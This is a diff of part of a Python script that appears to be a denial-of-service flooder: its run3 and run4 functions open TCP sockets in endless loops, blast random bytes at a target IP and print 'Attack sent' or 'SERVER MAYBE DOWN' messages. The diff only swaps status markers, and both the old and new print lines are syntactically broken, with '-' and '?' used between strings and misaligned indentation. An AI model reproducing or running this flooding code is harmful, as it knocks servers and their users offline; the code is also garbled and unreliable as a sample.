@@ -97,7 +97,7 @@ def run2():
 
 def run3():
 	data = random._urandom(818)
-	i = random.choice(("[+]","[-]","[!]"))
+	i = random.choice(("[+]","[?]","[!]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -105,7 +105,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i -"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
+			print(i ?"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
 		except:
 			s.close()
 			print("[!] \033[94mBASE2 \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
@@ -114,7 +114,7 @@ def run3():
   
 def run4():
 	data = random._urandom(16)
-	i = random.choice(("[*]","[-]","[!]"))
+	i = random.choice(("[*]","[?]","[!]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -122,7 +122,7 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-		        print(i -"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
+		        print(i ?"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
 		except:
 			s.close()
 			print("[!] \033[94mBASE2 \033[31mSERVER \033[96mMAYBE \033[31mDOWN..!! \033[0m")
